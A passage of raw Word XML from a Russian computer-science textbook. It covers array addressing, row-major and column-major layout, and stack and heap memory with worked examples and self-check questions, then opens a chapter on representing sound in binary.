        <w:t xml:space="preserve"> — это последовательность элементов одного типа, расположенных в памяти непрерывно. Адрес элемента с индексом `i` вычисляется по формуле:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Адрес[i] = Базовый_адрес + i × Размер_элемента</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Адресация элементов одномерного массива</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Массив из 5 целых чисел типа `int` (4 байта каждое) начинается с адреса 2000. Какие адреса имеют элементы массива?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Индекс:    0      1      2      3      4</w:t>
        <w:br/>
        <w:t>Адрес:  2000   2004   2008   2012   2016</w:t>
        <w:br/>
        <w:t>Размер: [   4   ][   4   ][   4   ][   4   ][   4   ] байта</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`array[0]`: адрес = 2000 + 0×4 = 2000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`array[1]`: адрес = 2000 + 1×4 = 2004</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`array[2]`: адрес = 2000 + 2×4 = 2008</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`array[3]`: адрес = 2000 + 3×4 = 2012</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`array[4]`: адрес = 2000 + 4×4 = 2016</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Многомерные массивы: row-major и column-major</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для многомерных массивов существуют два способа размещения в линейной памяти:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Row-major order</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (построчное размещение):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Элементы одной строки располагаются последовательно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используется в C, C++, Python (NumPy по умолчанию)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Column-major order</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (постолбцовое размещение):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Элементы одного столбца располагаются последовательно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используется в Fortran, MATLAB, R</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Размещение двумерного массива</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Двумерный массив `A[3][4]` (3 строки, 4 столбца) целых чисел по 4 байта начинается с адреса 3000. Определить адрес элемента `A[1][2]` в обоих форматах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Элементы массива:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>A[0][0]  A[0][1]  A[0][2]  A[0][3]</w:t>
        <w:br/>
        <w:t>A[1][0]  A[1][1]  A[1][2]  A[1][3]</w:t>
        <w:br/>
        <w:t>A[2][0]  A[2][1]  A[2][2]  A[2][3]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Row-major</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (построчно):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Порядок в памяти: A[0][0], A[0][1], A[0][2], A[0][3], A[1][0], A[1][1], A[1][2], ...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Формула: `Адрес[i][j] = Базовый_адрес + (i × Число_столбцов + j) × Размер_элемента`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для A[1][2]:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Адрес = 3000 + (1 × 4 + 2) × 4 = 3000 + 6 × 4 = 3000 + 24 = 3024</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Column-major</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (постолбцово):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Порядок в памяти: A[0][0], A[1][0], A[2][0], A[0][1], A[1][1], A[2][1], A[0][2], ...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Формула: `Адрес[i][j] = Базовый_адрес + (j × Число_строк + i) × Размер_элемента`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для A[1][2]:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Адрес = 3000 + (2 × 3 + 1) × 4 = 3000 + 7 × 4 = 3000 + 28 = 3028</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Практическое значение</w:t>
      </w:r>
      <w:r>
        <w:t>: Знание порядка размещения критично для оптимизации производительности. Обход массива в порядке, соответствующем его размещению в памяти, использует преимущества кэширования процессора.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Стек и куча: динамическая организация памяти</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Сегменты памяти процесса</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Память выполняющейся программы (процесса) организована в несколько сегментов:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сегмент кода** (text segment): содержит машинные инструкции программы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сегмент данных** (data segment): глобальные и статические переменные</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Стек** (stack): локальные переменные, параметры функций, адреса возврата</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Куча** (heap): динамически выделяемая память</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Стек</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стек</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> работает по принципу LIFO (Last In, First Out — последним пришёл, первым ушёл). При вызове функции на стек помещаются:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Параметры функции</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Адрес возврата</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Локальные переменные функции</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>При возврате из функции эти данные удаляются из стека.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики стека</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Быстрое выделение и освобождение памяти</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ограниченный размер (обычно несколько мегабайт)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Автоматическое управление памятью</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Куча</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Куча</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это область памяти для динамического выделения произвольных блоков памяти. Программист явно запрашивает память (например, функциями `malloc`, `new`) и должен явно её освобождать (`free`, `delete`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Характеристики кучи</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Гибкое выделение блоков любого размера</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Больший доступный объём памяти</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Требует явного управления (может привести к утечкам памяти)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Более медленное выделение/освобождение по сравнению со стеком</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 5: Размещение данных в стеке и куче</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Рассмотрим фрагмент кода:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>void function() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    int localVar = 42;           // Локальная переменная</w:t>
        <w:br/>
        <w:t xml:space="preserve">    int* heapVar = malloc(sizeof(int) * 100);  // Динамический массив</w:t>
        <w:br/>
        <w:t xml:space="preserve">    *heapVar = 10;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // ... работа с массивом ...</w:t>
        <w:br/>
        <w:t xml:space="preserve">    free(heapVar);</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Где будут размещены `localVar` и `heapVar`?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`localVar` — локальная переменная, размещается в **стеке**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Автоматически создаётся при входе в функцию</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Автоматически уничтожается при выходе из функции</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Адрес в стеке определяется указателем стека (stack pointer)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Массив из 100 целых чисел — размещается в **куче**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выделяется динамически функцией `malloc`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Память остаётся выделенной до явного освобождения функцией `free`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Адрес в куче возвращается функцией `malloc` и сохраняется в переменной `heapVar`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`heapVar` (сам указатель) — размещается в **стеке**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Это локальная переменная, хранящая адрес</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер указателя: 4 байта в 32-битных системах, 8 байт в 64-битных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Практическое значение</w:t>
      </w:r>
      <w:r>
        <w:t>: Понимание разницы между стеком и кучей помогает избежать распространённых ошибок:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Переполнение стека** (stack overflow) при рекурсии или больших локальных массивах</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Утечки памяти** (memory leaks) при забытом освобождении памяти в куче</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Висячие указатели** (dangling pointers) при обращении к освобождённой памяти</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Практическая значимость</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Понимание представления данных в памяти ЭВМ имеет множество практических применений:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Оптимизация программ**: Правильное использование типов данных и выравнивание структур может значительно повысить производительность.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Отладка**: Знание организации памяти помогает находить ошибки, связанные с выходом за границы массива, повреждением памяти.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Работа с низкоуровневыми API**: Взаимодействие с оборудованием, драйверами, операционной системой требует понимания байтового представления данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сетевое программирование**: Обмен данными между системами с разной архитектурой требует учёта порядка байтов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Разработка встраиваемых систем**: Ограниченные ресурсы памяти требуют максимально эффективного использования каждого байта.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Безопасность**: Многие уязвимости (переполнение буфера, атаки на стек) основаны на особенностях организации памяти.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Оперативная память (ОЗУ, RAM)** — быстродействующая энергозависимая память для временного хранения данных и программ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Байт** — минимальная адресуемая единица памяти, состоящая из 8 бит.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Адрес** — уникальный идентификатор (номер) ячейки памяти.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Слово (word)** — базовая единица данных, обрабатываемая процессором за одну операцию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Little Endian** — порядок байтов, при котором младший байт располагается по младшему адресу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Big Endian** — порядок байтов, при котором старший байт располагается по младшему адресу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Выравнивание (alignment)** — размещение данных в памяти по адресам, кратным размеру данных или степени двойки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Паддинг (padding)** — дополнительные неиспользуемые байты, вставляемые для обеспечения выравнивания.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Row-major order** — построчное размещение многомерного массива в линейной памяти.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Column-major order** — постолбцовое размещение многомерного массива в линейной памяти.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Стек (stack)** — область памяти для локальных переменных и адресов возврата, работающая по принципу LIFO.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Куча (heap)** — область памяти для динамического выделения блоков произвольного размера.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Утечка памяти (memory leak)** — ситуация, когда динамически выделенная память не освобождается после использования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы для самопроверки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теоретический вопрос**: Объясните, почему байт (8 бит) стал стандартной минимальной адресуемой единицей памяти в современных компьютерах. Какие альтернативы существовали в истории вычислительной техники?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практическая задача**: 64-битное целое число 0x123456789ABCDEF0 хранится в памяти, начиная с адреса 5000, в формате Little Endian. Запишите содержимое каждого байта памяти с адреса 5000 по 5007.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача на вычисление**: Рассчитайте минимальный размер (с учётом выравнивания по 8-байтовой границе) следующей структуры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```c</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   struct Data {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       char   a;     // 1 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       double b;     // 8 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       short  c;     // 2 байта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">       int    d;     // 4 байта</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   };</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   ```</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача на многомерные массивы**: Трёхмерный массив `B[2][3][4]` целых чисел (4 байта) начинается с адреса 6000. Массив размещён в row-major порядке (последний индекс изменяется быстрее всего). Найдите адрес элемента `B[1][2][1]`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Концептуальный вопрос**: В чём принципиальная разница между стеком и кучей с точки зрения управления памятью? Приведите примеры ситуаций, когда предпочтительнее использовать стек, и когда — кучу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связь с другими главами</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.1 (Арифметика в двоичной системе) — фундамент для понимания двоичного представления данных</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.9 (Представление числовых данных) — детализация способов кодирования чисел</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 2.1 (Архитектура ЭВМ) — аппаратная реализация организации памяти</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 3.1 (Операционные системы) — управление памятью на уровне ОС</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>_Глава подготовлена в соответствии со спецификацией учебника. Объём: ~11500 символов._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 1.3: Представление звуковых данных в двоичном коде</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Звук является одним из важнейших способов передачи информации в современном мире. От музыки и речи до звуковых эффектов в компьютерных играх — всё это необходимо представить в двоичном коде для обработки, хранения и передачи с помощью ЭВМ. В отличие от текстовых и числовых данных, которые по своей природе дискретны, звук представляет собой непрерывный (аналоговый) сигнал, что создаёт особые задачи при его цифровом представлении.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе мы рассмотрим, как происходит преобразование аналогового звукового сигнала в цифровую форму, изучим ключевые параметры, влияющие на качество и размер звуковых данных, а также познакомимся с методами хранения и сжатия аудиоинформации. Понимание этих принципов важно не только для работы с мультимедийными приложениями, но и для осознания общих принципов представления непрерывных величин в дискретной системе ЭВМ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Эта глава тесно связана с главой 1.2 (представление данных в памяти ЭВМ), так как мы будем рассматривать, сколько байтов занимают звуковые данные и как они организованы в памяти. Также знания из главы 1.1 (двоичная арифметика) помогут понять расчёты размеров аудиофайлов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Природа звука и аналого-цифровое преобразование</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Физическая природа звука</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Звук</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это механические колебания упругой среды (воздуха, воды, твёрдых тел), распространяющиеся в виде волн. Звуковая волна характеризуется:</w:t>
